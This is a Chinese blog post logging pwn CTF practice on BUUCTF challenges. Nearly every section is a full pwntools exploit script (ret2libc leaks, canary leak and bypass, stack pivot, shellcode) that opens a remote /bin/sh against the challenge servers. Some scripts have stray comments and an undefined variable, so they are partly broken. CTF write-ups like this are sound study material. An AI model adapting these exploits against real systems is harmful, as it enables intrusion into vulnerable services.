---
title: pwn日常刷题记录
date: 2023-03-07 20:22:58
tags: 刷题
categories: pwn
---

# 栈问题

## get_started_3dsctf_2016

**checksec**

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



```C++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}




void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 0x308CD64F && a2 == 425138641 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = (char)v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = (char)v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}

```



get_flag()有两个参数，a1和a2。这里我已经将a1和a2转换成了十六进制。if对a1和a2进行了一个判断，符合条件后进行对flag的读取。具体读取过程为：首先v2对flag.txt文件进行一个读取，v3用getc()来接收v2读取的值(getc():从指定的流stream获取下一个字符(一个无符号字符)，并把位置标识符往前移动)。在v3不为255时，将值传给v4，用中间变量v5来读取v2的值，并且在v5不为255时，将v5的值赋给v4并输出v4，最终输出的结果就是flag

但是我们发现通过main()的stackoverflow单纯的跳到get_flag()这个函数是无法拿到flag的，这里是因为我们在stackoverflow时覆盖了a1和a2，破坏了输出flag的条件，从而无法得到flag。我们试想，如果我们在stackoverflow时保护了栈结构，使程序达到输出flag的条件，正常退出，是否就可以拿到flag？

于是我们需要`exit()`的地址，以及满足条件的a1和a2的值，即`0x308CD64F`和`0x195719D1`

**exp**

```py
from pwn import *
context(os = "linux" , arch = "i386" , log_level = "debug")
elf = ELF('./pwn1')
io = remote('node4.buuoj.cn',27026)
ret = 0x08048196
exits = elf.sym['exit']
success("got exit addr : %s" % hex(exits))
payload = b"a" * 0x38 + p32(0x080489A0) + p32(exits) + p32(0x308CD64F)+ p32(0x195719D1)
io.recvuntil("Qual a palavrinha magica? " , timeout = 0.5)
io.sendline(payload)
io.recvline()
io.interactive()
```

## [OGeek2019]babyrop

先checksec一下，nx排除了shellcode的可能，Full RELEO为地址随机化

先观察主函数，设定了一个闹钟(但是这道题不需要使用解除闹钟的方法)

![](buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095347-1678706371578-4.png)

主函数的思路是生成一个随机数，把这个随机数作为参数传进sub——804871F()函数中，然后再将函数返回结果作为参数传进sub——80487D0()里,sub_80486bb()是初始化，没什么用。**fd=open("/dev/urandom",0);if(fd>0) read(fd,&buf,4u)**:获取一个随机数给到buf

**sub_804871f()**

![](buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095410.png)

sprintf函数将生成的随机数加到s[32]的数组中，这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：**使strncmp结果为0**

**sub_80487d0()**

![](buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-13%20095400.png)

这个函数将buf[7]作为参数出传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：**使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）**

**思路**

使用ROP链寻找libc解题

首先让strncmp结果为零，当buf与s数组完全相同时，strncmp结果会为0，但是s为系统生成的随机数，而buf是我们输入的数据，两者显然不可能相等。另一种办法就是**使v1等于0，这样strncmp的结果仍为0。**而v1是strlen函数读取buf的长度大小，使他为0就很简单了，标准的长度检测绕过，让buf数组的第一位为**‘\x00’**即可。此时程序不会退出

然后让buf[7]的值尽可能大，要实现栈溢出，buf[7]元素的ASCII码值必须大于两百四十多才行，所以要使用转义字符的ASCii码，'\'为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。

```py
from pwn import *
io = process("./pwn")
io = remote('node4.buuoj.cn',25352)
elf = ELF("./pwn")
libc = ELF("libc-2.23.so")
context(log_level="debug",arch="i386")
write_plt = elf.plt["write"]'''选择用write函数泄露libc地址'''
read_got = elf.got["read"]
main_func = 0x08048825
payload1 = b"\x00"长度检测绕过+ b"\xff"*7让buf[7]的值尽可能大,\为转义字符，而’\xhh‘表示ASCII码值与’hh’这个十六进制数相等的符号，例如’\xff’表示ASCII码为255的符号。
io.sendline(payload1)
io.recvline()
payload2 = flat([b"a"*0xE7,b"b"*4,write_plt,main_func,1,read_got,0x8])
io.sendline(payload2)
read_addr = u32(io.recv(4))
print(read_addr)
libcbase = read_addr - libc.symbols["read"]
#print libcbase
system_addr = libcbase + libc.symbols["system"]
binsh = libcbase + next(libc.search(b"/bin/sh"))
print(binsh)
payload3 = flat([b"a"*0xe7,b"b"*4,system_addr,0,binsh])
io.sendline(payload1)
io.recvline()
io.sendline(payload3)
io.interactive() 
```

## jarvisoj_level2_x64

简单的rop

```python
from pwn import *
r= remote('node4.buuoj.cn',27435)
elf=ELF("./level2_x64")
sys_addr=elf.symbols['system']
pop_rdi_addr=0x4006b3
bin_sh=0x600a90
payload=b'a'*0x88+p64(pop_rdi_addr)+p64(bin_sh)+p64(sys_addr)
r.sendline(payload)
r.interactive()
```



## ciscn_2019_en_2

from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')
ret = 0x4006b9      #靶机是ubuntu，所以需要栈平衡
elf = ELF('pwn1')
puts_plt = elf.plt["puts"] 
puts_got = elf.got['puts']
main_addr = elf.symbols["main"]
pop_rdi_ret = 0x400c83      #×64程序基本都存在的一个地址pop rdi；ret
p = remote('node4.buuoj.cn',25016)
payload = b'a' * (0x50 + 8)
payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
	print(payload)
p.sendlineafter('Input your choice!\n', '1')
p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
p.recvuntil('Ciphertext\n')	
p.recvline()
puts_addr = u64(p.recv(7)[:-1].ljust(8,b'\x00'))
print(puts_addr)      #找出puts的地址
libc = LibcSearcher('puts', puts_addr)
libc_base   = puts_addr - libc.dump('puts')      #找出函数地址偏移量
system_addr = libc_base + libc.dump('system')      #计算出system的在程序中的地址
binsh_addr  = libc_base + libc.dump('str_bin_sh')	
payload = b'a' * (0x50 + 8)
payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
p.sendlineafter('Input your choice!\n', '1')
p.sendlineafter('Input your Plaintext to be encrypted\n', payload)
p.interactive()

## not_the_same_3dsctf_2016

from pwn import *
elf = ELF("./not_the_same_3dsctf_2016")
io = remote("node4.buuoj.cn",28787)
io = process("./not_the_same_3dsctf_2016")
backdoor_addr = 0x080489A0
str_flag_addr = 0x080ECA2D
printf_addr = 0x0804F0A0
write_addr = elf.symbols['write']
exit_addr = elf.symbols['exit']
print(hex(write_addr))
这个main函数没有push ebp 所以不用再覆盖4字节的ebp
payload = 0x2D * b'a' + p32(backdoor_addr) + p32(write_addr) + p32(exit_addr) + p32(1) + p32(str_flag_addr) + p32(45)#覆盖了栈，没有覆盖ebp，原因是不存在ebp，字符串空间的底部就是函数的返回地址覆盖返回地址，返回到get_secret函数从get_secret函数返回到write函数#exit位置是write的返回的值，没什么用，随便填
payload += p32(1)           # write函数的第一个参数，是 文件描述符；
payload += p32(flagaddr)    # write函数的第二个参数，是 存放字符串的内存地址；
payload += p32(42)          # write函数的第三个参数，是 打印字符串的长度
io.sendline(payload)
io.interactive()
io.close()

## ciscn_2019_n_5

from pwn import *
context(os='linux',arch='amd64',log_level='debug')
elf = ELF("./pwn4")
p = remote('node4.buuoj.cn',25661)
shellcode=asm(shellcraft.sh())
p.sendlineafter('name\n',shellcode)
payload=flat(b'a'*0x28+p64(0x601080))
p.sendlineafter('me?\n',payload)
p.interactive()

## 铁人三项(第五赛区)_2018_rop

#encoding = utf-8
from pwn import * 
from LibcSearcher import * 
context(os = 'linux',arch = 'i386',log_level = 'debug')
elf = ELF('./2018_rop')
p = remote('node4.buuoj.cn',25020)
main_addr      = elf.sym['main']
plt_write_addr = elf.plt['write']
got_write_addr = elf.got['write']
payload        = b'a'*(0x88+0x4) + p32(plt_write_addr) + p32(main_addr) + p32(1) + p32(got_write_addr) + p32(4)
p.sendline(payload)
write_addr     = u32(p.recv(4))
print(hex(write_addr))
lib             = LibcSearcher('write',write_addr)
lib_write_addr  = lib.dump('write')
lib_system_addr = lib.dump('system')
lib_bin_addr    = lib.dump('str_bin_sh')
base_addr       = write_addr - lib_write_addr
system_addr     = base_addr  + lib_system_addr
bin_addr 	= base_addr  + lib_bin_addr
payload = b'a'*(0x88+0x4) + p32(system_addr) + b'aaaa' + p32(bin_addr)
p.sendline(payload)
p.interactive()

## bjdctf_2020_babyrop

from pwn import*
from LibcSearcher import *
context.log_level='debug'
r=remote('node4.buuoj.cn',28646)
elf=ELF('./pwn6')
main_addr=elf.sym['main']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_ret=0x400733
payload1=b'a'*0x28+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)

这里需要注意一下payload64位先往寄存器中传参顺序要注意！！！ 
r.recvuntil("Pull up your sword and tell me u story!")
r.sendline(payload1)
r.recv()
puts_addr=u64(r.recv(6).ljust(8,b'\x00'))
libc=LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')   
system = libc_base+libc.dump('system')   
bins = libc_base+libc.dump('str_bin_sh')
payload2=b'A'*0x28+p64(pop_ret)+p64(bins)+p64(system)
r.recvuntil("Pull up your sword and tell me u story!")
r.sendline(payload2)
r.interactive()

## bjdctf_2020_babystack2

from pwn import*
elf=ELF('pwn7')
r=remote('node4.buuoj.cn',28553)
back_addr=elf.symbols['backdoor']
r.recv()
r.sendline(b'-1')
payload=b'a'*(0x10+8)+p64(back_addr)
r.sendline(payload)
r.interactive()

## ciscn_2019_es_2

from pwn import *
context(os="linux",arch="i386",log_level="debug")
elf=ELF('pwn8')
p=remote('node4.buuoj.cn',29794)
sys_addr=0x08048400
leave_addr=0x8048562
payload1=b'a'*0x27
p.sendlineafter('name?\n',payload1)
p.recvuntil('\n')
ebp=u32(p.recv(4))
payload2=b'a'*4+p32(sys_addr)+p32(0)+p32(ebp-0x28)+b'/bin/sh'
payload2=payload2.ljust(0x28,b'\0')
payload2+=p32(ebp-0x38)看当时的ebp+p32(leave_addr)
p.sendline(payload2)
p.interactive()

## pwn2_sctf_2016

整数溢出问题
from pwn import*
from LibcSearcher import*
p=remote('node4.buuoj.cn',29476)
elf=ELF('./pwn9')
printf_plt=elf.plt['printf']
printf_got=elf.got['printf']
vuln=0x0804852f
main=0x080485b8
p.recvuntil('read?')
p.sendline(str(-1))
p.recvuntil('data!\n')
payload=b'a'*0x30+p32(printf_plt)+p32(vuln)+p32(printf_got)
p.sendline(payload)
p.recvuntil('\n')
printf_add=u32(p.recv(4))
print(hex(printf_add))
libc=LibcSearcher('printf',printf_add)
libc_base=printf_add-libc.dump('printf')
system=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')
p.recvuntil('read?')
p.sendline(str(-1))
p.recvuntil('data!\n')
payload=b'a'*0x30+p32(system)+p32(main)+p32(binsh)
p.sendline(payload)
p.interactive()

## jarvisoj_level3

32位ret2libc
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
conn = remote('node4.buuoj.cn',25837)
elf = ELF('./level3')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x0804844B
payload = b'a'*0x88 + b'b'*4 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
conn.sendlineafter("Input:\n",payload)
write_addr = u32(conn.recv(4))
print(hex(write_addr))
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = b'a'*0x88 + b'b'*4 + p32(system_addr) + p32(main_addr) + p32(bin_sh)
conn.sendlineafter("Input:\n",payload)
conn.interactive()

## [HarekazeCTF2019]baby_rop2

from pwn import *

#start
r = remote('node4.buuoj.cn',25683) 
r = process("../buu/[HarekazeCTF2019]baby_rop2")
elf = ELF('babyrop2')
libc = ELF("libc.so.6")

#params
rdi_addr = 0x400733
rsi_r15_addr = 0x400731
main_addr = elf.symbols['main']
printf_plt=elf.plt['printf']
read_got=elf.got['read']
format_str = 0x400770

#attack
payload=b'M'*(0x20+8) + p64(rdi_addr) + p64(format_str) + p64(rsi_r15_addr) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
r.recv()
r.sendline(payload)
read_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("read_addr: " + hex(read_addr))

#libc
base_addr = read_addr - libc.symbols['read']
system_addr = base_addr + libc.symbols['system']
bin_sh_addr = base_addr + next(libc.search(b'/bin/sh'))
print("system_addr: " + (hex(system_addr)))
print("bin_sh_addr: " + (hex(bin_sh_addr)))

#attack2
payload=b'M'*(0x20+8) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
r.recv()
r.sendline(payload)

r.interactive()

## [2021 鹤城杯]littleof

**checksec一下**

![](buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png)

发现有canary保护

**ida查看**

```c
unsigned __int64 sub_4006E2()
{
  char buf[8]; // [rsp+10h] [rbp-50h] BYREF
  FILE *v2; // [rsp+18h] [rbp-48h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = stdin;
  puts("Do you know how to do buffer overflow?");
  read(0, buf, 0x100uLL);
  printf("%s. Try harder!", buf);
  read(0, buf, 0x100uLL);
  puts("I hope you win");
  return __readfsqword(0x28u) ^ v3;
}
```

很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是**输出/写入/输出**的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。

**canary**

Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。

也就是说：

**假如我的 buf 大小为 0x50**

**如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。**

**也就是说 我的可用空间只有 0x42 。**

**开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16**

**而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址**

**关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08**

**这时候的 0x50 + 0x08 是 Return Address 的地址。**

具体思路如下：

**因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。**

**exp**

```python
from pwn import *
from LibcSearcher import *
 
#io = process("littleof")
io = remote()
elf = ELF("littleof")
context(log_level = 'debug',arch = 'amd64',os = 'linux')
 
rdi = 0x400863
ret = 0x40059E
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x400789
 
Padding = b'A' * ( 0x50 - 0x08 )
Padding_Ret = b'A' * 0x08
 
io.recvuntil(b'overflow?')
Payload_Canary = Padding
io.sendline(Payload_Canary)
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
Canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("Canary: " + (hex(Canary)))
 发送了0x49个字节，总共0x50个字节，程序会把Canary放在变量起始位置，所以只需要接收7个，然后用一个0填充即可。
 Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.sendlineafter(b'Try harder!',Payload_Leak)
addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
log.success("Real Address: " + (hex(addr)))
 
# Local
#ibc = LibcSearcher('puts',addr)
#base = addr - libc.dump('puts')
#system = base + libc.dump('system')
#binsh = base + libc.dump('str_bin_sh')
 
# Remote
base = addr - 0x080aa0
system = base + 0x04f550
binsh = base + 0x1b3e1a
 
io.recvuntil(b'overflow?')
Payload_Canary = Padding
io.sendline(Payload_Canary)
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
Canary = u64(io.recv(7).rjust(8, b'\x00'))
log.success("Canary: " + (hex(Canary)))
 
Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
io.sendlineafter(b'Try harder!',Payload_Shell)
io.interactive()
```

Padding就是上文泄露Canary的Payload

Canary就是Canary的数据

Padding_Ret 代表覆盖原先栈上的 RBP

Ret 用来平衡栈帧

Rdi 用来存放 system 的第一个函数，也就是 /bin/sh 字符串的地址的。
